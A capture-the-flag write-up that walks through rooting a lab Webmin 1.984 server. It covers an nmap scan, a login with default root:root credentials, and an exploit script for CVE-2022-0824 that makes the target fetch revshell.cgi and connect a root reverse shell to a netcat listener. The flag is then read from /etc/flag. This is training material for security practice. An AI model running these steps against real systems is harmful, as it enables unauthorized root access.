# **WebAdmin - ThunderCipher**

*Target Ip. Address: 192.168.5.215*

Let's begin with nmap scan.

```bash
kali@kali:nmap -sV -sC 192.168.5.215
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 14:57 IST
Nmap scan report for 192.168.5.215
Host is up (0.00044s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 57:a5:30:72:14:c3:d0:0b:ff:31:d1:bd:d7:36:9e:a6 (ECDSA)
|_  256 46:52:ed:69:b9:52:3d:0b:04:e8:c5:bb:44:89:15:ab (ED25519)
10000/tcp open  http    MiniServ 1.984 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
MAC Address: BC:24:11:10:74:9C (Proxmox Server Solutions GmbH)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.32 seconds
```

So, we have 2 ports. Port 22 (ssh) and Port 10000 (http, with Webmin).

The Webmin (MiniServ 1.984) has CVE:2022-0824, Remote Code Execution.

For, this we will need a valid credentials. Luckily, the default root:root works.

Set up a listener.

```bash
kali@kali:nc -nlvp 4445
listening on [any] 4445 ...
```

Run the exploit.

```bash
kali@kali:python3 exploit.py -t https://192.168.5.215:10000 -c root:root -LS 192.168.5.212:8080 -P 4445 -L 192.168.5.212

[+] Generating payload to revshell.cgi in current directory
[+] Login Successful
[+] Attempt to host http.server on 8080

[+] Sleep 3 second to ensure http server is up!
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.5.215 - - [11/Feb/2026 15:06:43] "GET /revshell.cgi HTTP/1.0" 200 -

[+] Fetching revshell.cgi from http.server 192.168.5.212:8080
[+] Modifying permission of revshell.cgi to 0755

[+] Success: shell spawned to 192.168.5.212 via port 4445 - XD
[+] Shell location: https://192.168.5.215:10000/revshell.cgi

[+] Cleaning up
[+] Killing: http.server on port 8080
```

Should receive a shell.

```bash
kali@kali:nc -nlvp 4445
listening on [any] 4445 ...
connect to [192.168.5.212] from (UNKNOWN) [192.168.5.215] 58774
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@ff2a9df53ccd:/usr/share/webmin/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

We are root. Let's find the flag.

```bash
root@ff2a9df53ccd:~# find / -name "*flag*" 2>/dev/null
find / -name "*flag*" 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/conf/all/ra_honor_pio_pflag
.
.
.
.
.
/usr/share/webmin/useradmin/help/flags.cs.auto.html
/usr/share/webmin/useradmin/help/flags.sk.auto.html
/usr/share/webmin/useradmin/help/flags.ro.auto.html
/usr/share/webmin/useradmin/help/flags.ur.auto.html
/usr/share/webmin/useradmin/help/flags.nl.html
/etc/flag
```

We find our flag at /etc/flag.

```bash
root@ff2a9df53ccd:~# cat /etc/flag
cat /etc/flag
ThunderCipher{We.....3!!}
```
